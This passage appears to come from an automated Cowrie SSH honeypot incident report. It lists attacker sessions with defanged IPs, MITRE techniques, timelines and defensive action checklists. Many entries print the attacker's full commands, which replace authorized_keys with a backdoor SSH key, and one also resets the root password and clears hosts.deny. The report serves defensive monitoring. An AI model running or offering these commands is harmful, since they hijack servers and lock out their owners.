| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:10:50` | `cowrie.session.connect` |
| `2026-05-06 16:10:50` | `cowrie.client.version` |
| `2026-05-06 16:10:50` | `cowrie.client.kex` |
| `2026-05-06 16:10:50` | `cowrie.login.success` |
| `2026-05-06 16:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54288827fd54

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-05-06 16:12 |
| **Last Seen** | 2026-05-06 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:12:50` | `cowrie.session.connect` |
| `2026-05-06 16:12:50` | `cowrie.client.version` |
| `2026-05-06 16:12:50` | `cowrie.client.kex` |
| `2026-05-06 16:12:50` | `cowrie.login.success` |
| `2026-05-06 16:12:51` | `cowrie.session.params` |
| `2026-05-06 16:12:51` | `cowrie.command.input` |
| `2026-05-06 16:12:51` | `cowrie.command.failed` |
| `2026-05-06 16:12:51` | `cowrie.log.closed` |
| `2026-05-06 16:12:51` | `cowrie.session.params` |
| `2026-05-06 16:12:51` | `cowrie.command.input` |
| `2026-05-06 16:12:51` | `cowrie.session.file_download` |
| `2026-05-06 16:12:51` | `cowrie.log.closed` |
| `2026-05-06 16:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd456dc0324

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-05-06 16:12 |
| **Last Seen** | 2026-05-06 16:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:12:52` | `cowrie.session.connect` |
| `2026-05-06 16:12:52` | `cowrie.client.version` |
| `2026-05-06 16:12:52` | `cowrie.client.kex` |
| `2026-05-06 16:12:52` | `cowrie.login.success` |
| `2026-05-06 16:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0694bbe67973

| Field | Detail |
|---|---|
| **Source IP** | `220.154.131[.]135` |
| **First Seen** | 2026-05-06 16:17 |
| **Last Seen** | 2026-05-06 16:17 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pWZvAjmdWDc0"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:17:20` | `cowrie.session.connect` |
| `2026-05-06 16:17:20` | `cowrie.client.version` |
| `2026-05-06 16:17:20` | `cowrie.client.kex` |
| `2026-05-06 16:17:21` | `cowrie.login.success` |
| `2026-05-06 16:17:21` | `cowrie.session.params` |
| `2026-05-06 16:17:21` | `cowrie.command.input` |
| `2026-05-06 16:17:21` | `cowrie.command.failed` |
| `2026-05-06 16:17:21` | `cowrie.log.closed` |
| `2026-05-06 16:17:22` | `cowrie.session.params` |
| `2026-05-06 16:17:22` | `cowrie.command.input` |
| `2026-05-06 16:17:22` | `cowrie.session.file_download` |
| `2026-05-06 16:17:22` | `cowrie.log.closed` |
| `2026-05-06 16:17:38` | `cowrie.session.params` |
| `2026-05-06 16:17:38` | `cowrie.command.input` |
| `2026-05-06 16:17:38` | `cowrie.log.closed` |
| `2026-05-06 16:17:38` | `cowrie.session.params` |
| `2026-05-06 16:17:38` | `cowrie.command.input` |
| `2026-05-06 16:17:39` | `cowrie.log.closed` |
| `2026-05-06 16:17:39` | `cowrie.session.params` |
| `2026-05-06 16:17:39` | `cowrie.command.input` |
| `2026-05-06 16:17:39` | `cowrie.session.file_download` |
| `2026-05-06 16:17:39` | `cowrie.log.closed` |
| `2026-05-06 16:17:40` | `cowrie.session.params` |
| `2026-05-06 16:17:40` | `cowrie.command.input` |
| `2026-05-06 16:17:40` | `cowrie.log.closed` |
| `2026-05-06 16:17:41` | `cowrie.session.params` |
| `2026-05-06 16:17:41` | `cowrie.command.input` |
| `2026-05-06 16:17:41` | `cowrie.log.closed` |
| `2026-05-06 16:17:41` | `cowrie.session.params` |
| `2026-05-06 16:17:41` | `cowrie.command.input` |
| `2026-05-06 16:17:41` | `cowrie.command.input` |
| `2026-05-06 16:17:41` | `cowrie.log.closed` |
| `2026-05-06 16:17:41` | `cowrie.session.params` |
| `2026-05-06 16:17:41` | `cowrie.command.input` |
| `2026-05-06 16:17:42` | `cowrie.log.closed` |
| `2026-05-06 16:17:42` | `cowrie.session.params` |
| `2026-05-06 16:17:42` | `cowrie.command.input` |
| `2026-05-06 16:17:42` | `cowrie.log.closed` |
| `2026-05-06 16:17:42` | `cowrie.session.params` |
| `2026-05-06 16:17:42` | `cowrie.command.input` |
| `2026-05-06 16:17:42` | `cowrie.log.closed` |
| `2026-05-06 16:17:43` | `cowrie.session.params` |
| `2026-05-06 16:17:43` | `cowrie.command.input` |
| `2026-05-06 16:17:43` | `cowrie.log.closed` |
| `2026-05-06 16:17:43` | `cowrie.session.params` |
| `2026-05-06 16:17:43` | `cowrie.command.input` |
| `2026-05-06 16:17:43` | `cowrie.log.closed` |
| `2026-05-06 16:17:44` | `cowrie.session.params` |
| `2026-05-06 16:17:44` | `cowrie.command.input` |
| `2026-05-06 16:17:44` | `cowrie.log.closed` |
| `2026-05-06 16:17:44` | `cowrie.session.params` |
| `2026-05-06 16:17:44` | `cowrie.command.input` |
| `2026-05-06 16:17:44` | `cowrie.log.closed` |
| `2026-05-06 16:17:45` | `cowrie.session.params` |
| `2026-05-06 16:17:45` | `cowrie.command.input` |
| `2026-05-06 16:17:45` | `cowrie.log.closed` |
| `2026-05-06 16:17:45` | `cowrie.session.params` |
| `2026-05-06 16:17:45` | `cowrie.command.input` |
| `2026-05-06 16:17:45` | `cowrie.log.closed` |
| `2026-05-06 16:17:46` | `cowrie.session.params` |
| `2026-05-06 16:17:46` | `cowrie.command.input` |
| `2026-05-06 16:17:46` | `cowrie.log.closed` |
| `2026-05-06 16:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.154.131[.]135` to AbuseIPDB if not already reported
- [ ] Block `220.154.131[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a17374b36df

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:18 |
| **Last Seen** | 2026-05-06 16:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:18:14` | `cowrie.session.connect` |
| `2026-05-06 16:18:14` | `cowrie.client.version` |
| `2026-05-06 16:18:14` | `cowrie.client.kex` |
| `2026-05-06 16:18:15` | `cowrie.login.success` |
| `2026-05-06 16:18:15` | `cowrie.session.params` |
| `2026-05-06 16:18:15` | `cowrie.command.input` |
| `2026-05-06 16:18:15` | `cowrie.command.failed` |
| `2026-05-06 16:18:15` | `cowrie.log.closed` |
| `2026-05-06 16:18:16` | `cowrie.session.params` |
| `2026-05-06 16:18:16` | `cowrie.command.input` |
| `2026-05-06 16:18:16` | `cowrie.session.file_download` |
| `2026-05-06 16:18:16` | `cowrie.log.closed` |
| `2026-05-06 16:18:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6964531f3d85

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:18 |
| **Last Seen** | 2026-05-06 16:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:18:19` | `cowrie.session.connect` |
| `2026-05-06 16:18:19` | `cowrie.client.version` |
| `2026-05-06 16:18:19` | `cowrie.client.kex` |
| `2026-05-06 16:18:20` | `cowrie.login.success` |
| `2026-05-06 16:18:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7129ca6e2db4

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:18 |
| **Last Seen** | 2026-05-06 16:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:18:59` | `cowrie.session.connect` |
| `2026-05-06 16:18:59` | `cowrie.client.version` |
| `2026-05-06 16:18:59` | `cowrie.client.kex` |
| `2026-05-06 16:19:00` | `cowrie.login.success` |
| `2026-05-06 16:19:00` | `cowrie.session.params` |
| `2026-05-06 16:19:00` | `cowrie.command.input` |
| `2026-05-06 16:19:00` | `cowrie.command.failed` |
| `2026-05-06 16:19:00` | `cowrie.log.closed` |
| `2026-05-06 16:19:01` | `cowrie.session.params` |
| `2026-05-06 16:19:01` | `cowrie.command.input` |
| `2026-05-06 16:19:01` | `cowrie.session.file_download` |
| `2026-05-06 16:19:01` | `cowrie.log.closed` |
| `2026-05-06 16:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abf93882a20d

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:19 |
| **Last Seen** | 2026-05-06 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:19:04` | `cowrie.session.connect` |
| `2026-05-06 16:19:04` | `cowrie.client.version` |
| `2026-05-06 16:19:04` | `cowrie.client.kex` |
| `2026-05-06 16:19:05` | `cowrie.login.success` |
| `2026-05-06 16:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10cad0ef1436

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:19 |
| **Last Seen** | 2026-05-06 16:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:19:46` | `cowrie.session.connect` |
| `2026-05-06 16:19:46` | `cowrie.client.version` |
| `2026-05-06 16:19:47` | `cowrie.client.kex` |
| `2026-05-06 16:19:47` | `cowrie.login.success` |
| `2026-05-06 16:19:48` | `cowrie.session.params` |
| `2026-05-06 16:19:48` | `cowrie.command.input` |
| `2026-05-06 16:19:48` | `cowrie.command.failed` |
| `2026-05-06 16:19:48` | `cowrie.log.closed` |
| `2026-05-06 16:19:49` | `cowrie.session.params` |
| `2026-05-06 16:19:49` | `cowrie.command.input` |
| `2026-05-06 16:19:49` | `cowrie.session.file_download` |
| `2026-05-06 16:19:49` | `cowrie.log.closed` |
| `2026-05-06 16:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4039ce41e29c

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:19 |
| **Last Seen** | 2026-05-06 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:19:52` | `cowrie.session.connect` |
| `2026-05-06 16:19:52` | `cowrie.client.version` |
| `2026-05-06 16:19:52` | `cowrie.client.kex` |
| `2026-05-06 16:19:52` | `cowrie.login.success` |
| `2026-05-06 16:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed0c0268b76a

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:20 |
| **Last Seen** | 2026-05-06 16:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:20:33` | `cowrie.session.connect` |
| `2026-05-06 16:20:33` | `cowrie.client.version` |
| `2026-05-06 16:20:33` | `cowrie.client.kex` |
| `2026-05-06 16:20:33` | `cowrie.login.success` |
| `2026-05-06 16:20:34` | `cowrie.session.params` |
| `2026-05-06 16:20:34` | `cowrie.command.input` |
| `2026-05-06 16:20:34` | `cowrie.command.failed` |
| `2026-05-06 16:20:34` | `cowrie.log.closed` |
| `2026-05-06 16:20:34` | `cowrie.session.params` |
| `2026-05-06 16:20:34` | `cowrie.command.input` |
| `2026-05-06 16:20:35` | `cowrie.session.file_download` |
| `2026-05-06 16:20:35` | `cowrie.log.closed` |
| `2026-05-06 16:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51c83dc22665

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:20 |
| **Last Seen** | 2026-05-06 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:20:37` | `cowrie.session.connect` |
| `2026-05-06 16:20:37` | `cowrie.client.version` |
| `2026-05-06 16:20:37` | `cowrie.client.kex` |
| `2026-05-06 16:20:38` | `cowrie.login.success` |
| `2026-05-06 16:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1670e4937346

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:21 |
| **Last Seen** | 2026-05-06 16:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:21:20` | `cowrie.session.connect` |
| `2026-05-06 16:21:20` | `cowrie.client.version` |
| `2026-05-06 16:21:21` | `cowrie.client.kex` |
| `2026-05-06 16:21:21` | `cowrie.login.success` |
| `2026-05-06 16:21:22` | `cowrie.session.params` |
| `2026-05-06 16:21:22` | `cowrie.command.input` |
| `2026-05-06 16:21:22` | `cowrie.command.failed` |
| `2026-05-06 16:21:22` | `cowrie.log.closed` |
| `2026-05-06 16:21:22` | `cowrie.session.params` |
| `2026-05-06 16:21:22` | `cowrie.command.input` |
| `2026-05-06 16:21:23` | `cowrie.session.file_download` |
| `2026-05-06 16:21:23` | `cowrie.log.closed` |
| `2026-05-06 16:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a143e18b5fee

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:21 |
| **Last Seen** | 2026-05-06 16:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:21:25` | `cowrie.session.connect` |
| `2026-05-06 16:21:25` | `cowrie.client.version` |
| `2026-05-06 16:21:25` | `cowrie.client.kex` |
| `2026-05-06 16:21:26` | `cowrie.login.success` |
| `2026-05-06 16:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.139.23[.]230` to AbuseIPDB if not already reported
- [ ] Block `86.139.23[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3001a541839

| Field | Detail |
|---|---|
| **Source IP** | `86.139.23[.]230` |
| **First Seen** | 2026-05-06 16:22 |
| **Last Seen** | 2026-05-06 16:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-06 16:22:09` | `cowrie.session.connect` |
| `2026-05-06 16:22:09` | `cowrie.client.version` |
| `2026-05-06 16:22:10` | `cowrie.client.kex` |
| `2026-05-06 16:22:10` | `cowrie.login.success` |
| `2026-05-06 16:22:11` | `cowrie.session.params` |
| `2026-05-06 16:22:11` | `cowrie.command.input` |
| `2026-05-06 16:22:11` | `cowrie.command.failed` |
| `2026-05-06 16:22:11` | `cowrie.log.closed` |
| `2026-05-06 16:22:11` | `cowrie.session.params` |
